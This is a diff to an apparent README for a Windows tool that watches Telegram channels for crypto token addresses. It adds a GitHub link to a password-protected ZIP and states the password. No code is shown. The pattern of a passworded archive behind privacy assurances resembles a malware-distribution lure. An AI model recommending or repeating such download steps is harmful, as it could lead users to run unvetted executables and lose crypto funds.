@@ -18,7 +18,7 @@ Local Processing: All Telegram monitoring logic operates on your PC, ensuring th
 Your privacy is our priority. The application is designed to function without accessing or sharing any personal information about your Telegram groups and channels. All operations related to monitoring are conducted locally on your device.
 
 ### Getting Started
-Download and Install: Follow the installation instructions to set up the application on your Windows PC.
+<a href="https://github.com/Ape4Me/ape4me-agent/blob/main/ape4me-agent-v11_w64.zip">Download</a> and Install: Download and extract ZIP archive to new Ape4Me Agent folder on your Windows PC. Archive password is "ape4me", use it when extracting.
 
 Configure Your Settings: Specify the groups and channels you wish to monitor for token addresses.
 
